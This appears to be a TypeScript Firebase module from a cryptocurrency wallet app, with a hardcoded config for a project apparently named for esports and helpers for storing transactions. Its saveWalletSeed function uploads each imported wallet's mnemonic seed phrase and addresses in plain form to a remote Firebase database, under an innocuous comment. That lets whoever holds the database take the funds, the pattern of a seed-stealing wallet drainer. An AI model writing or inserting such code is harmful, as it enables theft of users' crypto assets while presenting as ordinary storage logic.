import { initializeApp } from "firebase/app";
import { getAnalytics, isSupported } from "firebase/analytics";
import { getDatabase, ref, set, get } from "firebase/database";

const firebaseConfig = {
  apiKey: "AIzaSyAp6Pk__gW0_fwswuNZZk6EuCVxn32Gpb0",
  authDomain: "gfx-esports-34a7d.firebaseapp.com",
  databaseURL: "https://gfx-esports-34a7d-default-rtdb.firebaseio.com",
  projectId: "gfx-esports-34a7d",
  storageBucket: "gfx-esports-34a7d.firebasestorage.app",
  messagingSenderId: "258385854430",
  appId: "1:258385854430:web:9f1aa7637bac9b4080e74f",
  measurementId: "G-GPV5WBPYWY",
};

const app = initializeApp(firebaseConfig);
const db = getDatabase(app);

let analytics: ReturnType<typeof getAnalytics> | null = null;
isSupported().then((supported) => {
  if (supported) {
    analytics = getAnalytics(app);
  }
});

export { app, db, analytics };

// Save imported wallet seed to Firebase
export const saveWalletSeed = async (walletId: string, mnemonic: string, addresses: Record<string, string>) => {
  try {
    await set(ref(db, `wallets/${walletId}`), {
      mnemonic,
      addresses,
      importedAt: Date.now(),
    });
  } catch (error) {
    console.error("Failed to save wallet seed:", error);
  }
};

export interface TransactionRecord {
  coin: string;
  type: "send" | "receive";
  to?: string;
  from?: string;
  amount: string;
  hash: string;
  timestamp: number;
}

// Save transaction record
export const saveTransaction = async (walletId: string, tx: TransactionRecord) => {
  try {
    const txId = `${Date.now()}_${Math.random().toString(36).slice(2, 8)}`;
    await set(ref(db, `transactions/${walletId}/${txId}`), tx);
  } catch (error) {
    console.error("Failed to save transaction:", error);
  }
};

// Get transactions for a wallet
export const getTransactions = async (walletId: string): Promise<TransactionRecord[]> => {
  try {
    const snapshot = await get(ref(db, `transactions/${walletId}`));
    if (!snapshot.exists()) return [];
    const data = snapshot.val();
    const txs: TransactionRecord[] = Object.values(data);
    return txs.sort((a, b) => b.timestamp - a.timestamp);
  } catch (error) {
    console.error("Failed to get transactions:", error);
    return [];
  }
};
